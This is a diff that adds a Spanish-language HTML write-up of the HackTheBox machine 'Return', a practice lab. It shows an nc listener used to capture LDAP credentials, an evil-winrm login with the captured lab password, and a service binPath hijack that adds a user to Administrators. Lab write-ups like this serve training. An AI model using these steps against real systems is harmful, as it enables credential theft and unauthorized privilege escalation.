@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Return HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/return/pasted-image-20260122164244.png" alt="Return HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Return</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>LDAP</span>
+            <span>printer</span>
+            <span>server_operators</span>
+            <span>WinRM</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Explotación</code>: <code>Banner Grab</code></li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Server Operators</code> mediante restauración de servicio</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Banner Grab</h2>
+          <div class="code-card">
+            <h3>Banner Grab: Web http://IP/settings.php</h3>
+            <pre><code># Cambiar Server Address por Kali IP mientras nos ponemos en escucha
+nc -nlvp 389</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/return/4.png" alt="Return HTB" />
+          <img class="writeup-image" src="/writeups/assets/return/5.png" alt="Return HTB" />
+          <div class="code-card">
+            <h3>WinRM: Acceso al sistema</h3>
+            <pre><code>evil-winrm -i target -u &#x27;svc-printer&#x27; -p &#x27;1edFg43012!!&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo Server Operators y Privilegio Restore</h2>
+          <div class="code-card">
+            <h3>CMD: Buscar Servicios Privilegiados que corran como LocalSystem (SYSTEM)</h3>
+            <pre><code>services
+sc.exe qc ADWS</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/return/pasted-image-20260224151833.png" alt="Return HTB" />
+          <div class="code-card">
+            <h3>CMD: Editar Path para ejecutar un comando</h3>
+            <pre><code># Agregar nuestro usuario a administrators
+sc.exe config ADWS binPath= &quot;cmd /c net localgroup Administrators svc-printe /add&quot;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+            <pre><code>sc stop ADWS
+sc start ADWS</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>CMD: Confirmar que hemos conseguido ser ADMINS</h3>
+            <pre><code>net localgroup Administrators
+# Si somos del grupo Administrators pero no tenemos aún privilegios reinicia la shell</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>LDAP</span>
+            <span>printer</span>
+            <span>server_operators</span>
+            <span>WinRM</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
